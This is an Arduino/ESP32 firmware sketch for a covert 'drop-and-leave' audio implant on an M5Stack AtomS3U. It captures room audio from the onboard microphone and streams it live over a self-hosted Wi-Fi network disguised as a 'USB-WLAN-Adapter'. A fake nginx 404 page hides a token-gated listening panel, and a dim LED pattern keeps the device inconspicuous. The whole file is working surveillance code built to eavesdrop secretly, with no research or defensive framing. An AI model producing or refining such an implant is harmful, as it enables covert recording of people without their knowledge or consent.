// ============================================================================
// audio_implant.ino — Drop-and-Leave Physical Audio Implant  (v4)
// Target: M5Stack AtomS3U (ESP32-S3, SPM1423 PDM Mic)
// Framework: Arduino (esp32 core) + M5Unified
//
// v4 — Zero external dependencies. Only uses:
//   <M5Unified.h>, <WiFi.h>, <WebServer.h> (all bundled)
//
// Key fixes from reference analysis (USBArmyKnife):
//   - Raw ESP-IDF driver/i2s_pdm.h (not M5Unified mic API)
//   - Corrected pin mapping: CLK=GPIO39, DATA=GPIO38
//   - I2S_PDM_SLOT_RIGHT per reference
//   - Streaming via raw WiFiServer on port 81 (no external libs)
// ============================================================================

#include <M5Unified.h>
#include <WiFi.h>
#include <WebServer.h>
#include "driver/i2s_pdm.h"

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------
static const char* AP_SSID    = "USB-WLAN-Adapter";
static const char* AP_PASS    = "adminadmin";
static const char* AUTH_TOKEN = "root";

// I2S / PDM Microphone (SPM1423 on M5Stack AtomS3U)
// Pin mapping verified from USBArmyKnife platformio.ini [env:M5-Atom-S3U]
//   CLK  = GPIO 39  (PDM clock output  → microphone CLK)
//   DATA = GPIO 38  (PDM data input    ← microphone DATA)
#define I2S_SPM1423_CLK   39
#define I2S_SPM1423_DATA  38

static const int SAMPLE_RATE  = 16000;
static const int READ_SIZE    = 1024;    // bytes per i2s_channel_read call
static const int MAX_BUF_SIZE = 4096;    // accumulate before TCP send

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------
WebServer   httpServer(80);    // HTML pages
WiFiServer  streamServer(81);  // raw PCM stream

static i2s_chan_handle_t rx_chan = NULL;

// Double buffer for mic task → stream handler communication
static uint8_t  micBufA[MAX_BUF_SIZE];
static uint8_t  micBufB[MAX_BUF_SIZE];
static volatile uint8_t* readyBuf     = NULL;   // buffer ready for sending
static volatile size_t   readyBufLen  = 0;
static volatile bool     bufReady     = false;
static volatile bool     micCapture   = false;

// LED pulsing state
unsigned long lastLedUpdate = 0;

// ---------------------------------------------------------------------------
// PROGMEM: Fake nginx 404 page
// ---------------------------------------------------------------------------
static const char FAKE_404[] PROGMEM = R"rawliteral(
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
)rawliteral";

// ---------------------------------------------------------------------------
// PROGMEM: Control Panel HTML/JS (served at /?token=root)
//
// Uses fetch() + ReadableStream to receive raw PCM binary data.
//
// Audio pipeline in JavaScript:
//   1. fetch('/stream') on port 81 with token
//   2. Byte-alignment buffer: hold back odd trailing bytes
//   3. DataView.getInt16 (LE) → Float32 with gain ×8 and clamp
//   4. AudioBufferSourceNode jitter-buffered via nextTime timeline
// ---------------------------------------------------------------------------
static const char CONTROL_PANEL[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Device Control</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Courier New', monospace;
    background: #0a0e17;
    color: #c0c8d8;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
  }
  .panel {
    background: rgba(15,20,35,0.95);
    border: 1px solid #1a3050;
    border-radius: 12px;
    padding: 32px;
    max-width: 480px;
    width: 90%;
    box-shadow: 0 0 40px rgba(0,100,200,0.1);
  }
  h1 {
    font-size: 16px;
    color: #4a9eff;
    letter-spacing: 2px;
    text-transform: uppercase;
    margin-bottom: 24px;
    text-align: center;
  }
  .status {
    font-size: 12px;
    color: #506880;
    text-align: center;
    margin-bottom: 20px;
    min-height: 16px;
  }
  .status.active { color: #00e676; }
  .status.error  { color: #ff5252; }
  .meter {
    width: 100%;
    height: 4px;
    background: #112;
    border-radius: 2px;
    margin-bottom: 24px;
    overflow: hidden;
  }
  .meter-bar {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #0d47a1, #00e5ff);
    transition: width 0.15s;
    border-radius: 2px;
  }
  button {
    display: block;
    width: 100%;
    padding: 14px;
    font-family: inherit;
    font-size: 14px;
    letter-spacing: 1px;
    border: 1px solid #1a3050;
    border-radius: 8px;
    cursor: pointer;
    transition: all 0.2s;
    text-transform: uppercase;
  }
  #btnStart {
    background: rgba(0,100,255,0.1);
    color: #4a9eff;
  }
  #btnStart:hover { background: rgba(0,100,255,0.25); }
  #btnStop {
    background: rgba(255,50,50,0.1);
    color: #ff5252;
    margin-top: 10px;
    display: none;
  }
  #btnStop:hover { background: rgba(255,50,50,0.25); }
  .info {
    margin-top: 20px;
    font-size: 11px;
    color: #304060;
    text-align: center;
    line-height: 1.6;
  }
</style>
</head>
<body>
<div class="panel">
  <h1>&#x1F399; Audio Monitor</h1>
  <div id="status" class="status">Ready</div>
  <div class="meter"><div id="meter" class="meter-bar"></div></div>
  <button id="btnStart" onclick="startStream()">Start Listening</button>
  <button id="btnStop" onclick="stopStream()">Stop</button>
  <div class="info">
    PCM 16-bit &middot; 16 kHz &middot; Mono<br>
    Gain: 8.0x &middot; Jitter-buffered
  </div>
</div>

<script>
let audioCtx  = null;
let reader    = null;
let running   = false;
let nextTime  = 0;
let leftover  = null;

const SAMPLE_RATE = 16000;
const GAIN        = 8.0;

function setStatus(msg, cls) {
  const el = document.getElementById('status');
  el.textContent = msg;
  el.className = 'status ' + (cls || '');
}
function setMeter(pct) {
  document.getElementById('meter').style.width = Math.min(100, pct) + '%';
}

async function startStream() {
  if (running) return;
  running = true;
  document.getElementById('btnStart').style.display = 'none';
  document.getElementById('btnStop').style.display  = 'block';
  setStatus('Connecting...', '');

  try {
    audioCtx = new (window.AudioContext || window.webkitAudioContext)({
      sampleRate: SAMPLE_RATE
    });
    // CRITICAL: browsers suspend AudioContext by default (autoplay policy)
    await audioCtx.resume();
    nextTime = 0;
    leftover = null;

    // Connect to the dedicated stream port (81)
    const response = await fetch('http://' + location.hostname + ':81/stream?token=root');
    if (!response.ok) throw new Error('HTTP ' + response.status);
    reader = response.body.getReader();
    setStatus('Streaming', 'active');
    pump();
  } catch (e) {
    setStatus('Error: ' + e.message, 'error');
    stopStream();
  }
}

async function pump() {
  while (running) {
    let result;
    try {
      result = await reader.read();
    } catch (e) {
      setStatus('Stream lost', 'error');
      stopStream();
      return;
    }
    if (result.done) {
      setStatus('Stream ended', '');
      stopStream();
      return;
    }

    const chunk = result.value;

    // ----------------------------------------------------------------
    // BYTE-ALIGNMENT BUFFER
    //
    // Each 16-bit PCM sample = 2 bytes. TCP can fragment at any byte
    // boundary. If we have an odd number of total bytes, hold back
    // the last byte and prepend it to the next chunk.
    // ----------------------------------------------------------------
    let data;
    if (leftover) {
      data = new Uint8Array(leftover.length + chunk.length);
      data.set(leftover, 0);
      data.set(chunk, leftover.length);
      leftover = null;
    } else {
      data = chunk;
    }
    if (data.length % 2 !== 0) {
      leftover = data.slice(data.length - 1);
      data = data.slice(0, data.length - 1);
    }
    if (data.length === 0) continue;

    // Convert PCM bytes -> Float32 with gain
    const sampleCount = data.length / 2;
    const floats = new Float32Array(sampleCount);
    const view = new DataView(data.buffer, data.byteOffset, data.length);
    for (let i = 0; i < sampleCount; i++) {
      let v = (view.getInt16(i * 2, true) / 32768.0) * GAIN;
      if (v >  1.0) v =  1.0;
      if (v < -1.0) v = -1.0;
      floats[i] = v;
    }

    // Schedule playback with jitter buffer
    const audioBuf = audioCtx.createBuffer(1, sampleCount, SAMPLE_RATE);
    audioBuf.getChannelData(0).set(floats);
    const src = audioCtx.createBufferSource();
    src.buffer = audioBuf;
    src.connect(audioCtx.destination);

    if (nextTime === 0 || audioCtx.currentTime > nextTime) {
      nextTime = audioCtx.currentTime + 0.05;
    }
    src.start(nextTime);
    nextTime += audioBuf.duration;

    // VU meter
    let sum = 0;
    const end = Math.min(64, sampleCount);
    for (let i = 0; i < end; i++) sum += floats[i] * floats[i];
    setMeter(Math.sqrt(sum / end) * 200);
  }
}

function stopStream() {
  running = false;
  if (reader) { try { reader.cancel(); } catch (_) {} reader = null; }
  if (audioCtx) { try { audioCtx.close(); } catch (_) {} audioCtx = null; }
  leftover = null;
  setMeter(0);
  document.getElementById('btnStart').style.display = 'block';
  document.getElementById('btnStop').style.display  = 'none';
  setStatus('Ready', '');
}
</script>
</body>
</html>
)rawliteral";

// ---------------------------------------------------------------------------
// I2S PDM Microphone Setup (raw ESP-IDF driver)
// Based on USBArmyKnife SPM1423/HardwareMicrophone.cpp
// ---------------------------------------------------------------------------
bool setupMicrophone() {
  // Step 1: Allocate RX-only I2S channel
  i2s_chan_config_t rx_chan_cfg = I2S_CHANNEL_DEFAULT_CONFIG(I2S_NUM_AUTO, I2S_ROLE_MASTER);
  if (i2s_new_channel(&rx_chan_cfg, NULL, &rx_chan) != ESP_OK) {
    Serial.println("[MIC] i2s_new_channel FAILED");
    return false;
  }

  // Step 2: Configure PDM RX mode
  i2s_pdm_rx_config_t pdm_rx_cfg = {
    .clk_cfg  = I2S_PDM_RX_CLK_DEFAULT_CONFIG(SAMPLE_RATE),
    .slot_cfg = I2S_PDM_RX_SLOT_DEFAULT_CONFIG(I2S_DATA_BIT_WIDTH_16BIT, I2S_SLOT_MODE_MONO),
    .gpio_cfg = {
      .clk = (gpio_num_t)I2S_SPM1423_CLK,
      .din = (gpio_num_t)I2S_SPM1423_DATA,
      .invert_flags = {
        .clk_inv = false,
      },
    },
  };
  // SPM1423 PDM data on right slot (per USBArmyKnife reference)
  pdm_rx_cfg.slot_cfg.slot_mask = I2S_PDM_SLOT_RIGHT;

  if (i2s_channel_init_pdm_rx_mode(rx_chan, &pdm_rx_cfg) != ESP_OK) {
    Serial.println("[MIC] i2s_channel_init_pdm_rx_mode FAILED");
    return false;
  }

  // Step 3: Enable RX channel
  if (i2s_channel_enable(rx_chan) != ESP_OK) {
    Serial.println("[MIC] i2s_channel_enable FAILED");
    return false;
  }

  Serial.println("[MIC] SPM1423 PDM microphone initialized OK");
  return true;
}

// ---------------------------------------------------------------------------
// HTTP Helper: check auth token
// ---------------------------------------------------------------------------
bool isAuthorized() {
  return httpServer.hasArg("token") && httpServer.arg("token") == AUTH_TOKEN;
}

// ---------------------------------------------------------------------------
// HTTP Handler: GET / — fake 404 or control panel
// ---------------------------------------------------------------------------
void handleRoot() {
  if (isAuthorized()) {
    httpServer.send_P(200, "text/html", CONTROL_PANEL);
  } else {
    httpServer.send_P(404, "text/html", FAKE_404);
  }
}

// ---------------------------------------------------------------------------
// FreeRTOS Task: Continuous mic recording (Core 0)
//
// Fills double buffer alternately. When one buffer is full (4096 bytes),
// it's marked as ready for the stream handler to pick up.
// ---------------------------------------------------------------------------
void micTask(void* param) {
  uint8_t* writeBuf = micBufA;  // currently writing to this buffer
  bool useA = true;

  while (true) {
    if (micCapture && rx_chan != NULL) {
      uint32_t offset = 0;

      // Accumulate MAX_BUF_SIZE bytes of PCM data
      while (offset < MAX_BUF_SIZE && micCapture) {
        size_t bytesRead = 0;
        esp_err_t ret = i2s_channel_read(
          rx_chan,
          writeBuf + offset,
          READ_SIZE,
          &bytesRead,
          pdMS_TO_TICKS(500)
        );
        if (ret == ESP_OK && bytesRead > 0) {
          offset += bytesRead;
        } else {
          break;
        }
      }

      if (offset > 0) {
        // Swap: mark the filled buffer as ready, switch to the other
        readyBuf    = writeBuf;
        readyBufLen = offset;
        bufReady    = true;

        // Switch to the other buffer for next recording cycle
        useA = !useA;
        writeBuf = useA ? micBufA : micBufB;
      }
    } else {
      vTaskDelay(pdMS_TO_TICKS(50));
    }

    vTaskDelay(1);  // yield
  }
}

// ---------------------------------------------------------------------------
// Stream Server: Handle client on port 81
//
// Reads the HTTP GET line for auth, then streams raw PCM from the ring
// buffer. Blocks until the client disconnects.
// ---------------------------------------------------------------------------
void handleStreamClient(WiFiClient& client) {
  // Read the HTTP request line to extract the token
  String requestLine = client.readStringUntil('\n');
  requestLine.trim();

  // Consume remaining headers
  while (client.available()) {
    String line = client.readStringUntil('\n');
    line.trim();
    if (line.length() == 0) break;
  }

  // Validate token
  if (requestLine.indexOf("token=root") < 0) {
    client.println("HTTP/1.1 404 Not Found");
    client.println("Content-Type: text/html");
    client.println("Connection: close");
    client.println();
    client.println("<h1>404 Not Found</h1>");
    client.stop();
    return;
  }

  // Send HTTP headers for raw binary stream
  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: application/octet-stream");
  client.println("Cache-Control: no-cache, no-store");
  client.println("Access-Control-Allow-Origin: *");
  client.println("Connection: close");
  client.println();

  Serial.println("[STREAM] Client connected, starting mic capture");
  micCapture = true;
  bufReady   = false;

  while (client.connected()) {
    if (bufReady) {
      // Send the completed buffer
      size_t len = readyBufLen;
      const uint8_t* buf = (const uint8_t*)readyBuf;
      bufReady = false;

      size_t sent = 0;
      while (sent < len && client.connected()) {
        size_t chunk = min((size_t)512, len - sent);
        size_t written = client.write(buf + sent, chunk);
        if (written == 0) break;
        sent += written;
        delay(1);  // yield for Wi-Fi stack
      }
    } else {
      delay(5);  // wait for next buffer
    }
  }

  Serial.println("[STREAM] Client disconnected, stopping mic capture");
  micCapture = false;
  client.stop();
}

// ---------------------------------------------------------------------------
// LED pulsing: faint dark blue/cyan
// ---------------------------------------------------------------------------
void updateLED() {
  unsigned long now = millis();
  if (now - lastLedUpdate < 150) return;
  lastLedUpdate = now;

  uint8_t r = random(0, 15);
  uint8_t g = random(0, 40);
  uint8_t b = random(20, 80);

  if (random(0, 100) < 30) {
    r = 0; g = 0; b = random(3, 15);
  }

  M5.Display.fillScreen(M5.Display.color565(r, g, b));
}

// ---------------------------------------------------------------------------
// Arduino setup()
// ---------------------------------------------------------------------------
void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println("\n[BOOT] Audio Implant v4 starting...");

  // --- M5Unified init (LED only, no speaker, no mic via M5) ---
  auto cfg = M5.config();
  cfg.internal_spk = false;
  cfg.internal_mic = false;  // we use ESP-IDF I2S directly
  M5.begin(cfg);
  M5.Speaker.end();

  // --- LED init ---
  M5.Display.setBrightness(60);
  M5.Display.fillScreen(TFT_BLACK);
  randomSeed(esp_random());

  // --- Initialize PDM microphone via ESP-IDF I2S driver ---
  if (!setupMicrophone()) {
    Serial.println("[BOOT] FATAL: Microphone init failed!");
    M5.Display.fillScreen(TFT_RED);
    while (true) { delay(1000); }
  }

  // --- SoftAP Wi-Fi ---
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID, AP_PASS);
  Serial.printf("[WIFI] AP '%s' IP: %s\n", AP_SSID, WiFi.softAPIP().toString().c_str());

  // --- HTTP Server (port 80) ---
  httpServer.on("/", HTTP_GET, handleRoot);
  httpServer.onNotFound([]() {
    httpServer.send_P(404, "text/html", FAKE_404);
  });
  httpServer.begin();
  Serial.println("[HTTP] Port 80 ready");

  // --- Stream Server (port 81) ---
  streamServer.begin();
  Serial.println("[STREAM] Port 81 ready");

  // --- Mic capture task on Core 0 ---
  xTaskCreatePinnedToCore(micTask, "mic", 8192, NULL, 2, NULL, 0);
  Serial.println("[BOOT] Mic task on Core 0");
  Serial.println("[BOOT] Ready.");
}

// ---------------------------------------------------------------------------
// Arduino loop() — Core 1
// ---------------------------------------------------------------------------
void loop() {
  M5.update();
  httpServer.handleClient();

  // Accept stream client on port 81
  WiFiClient streamClient = streamServer.available();
  if (streamClient) {
    handleStreamClient(streamClient);
  }

  updateLED();
}
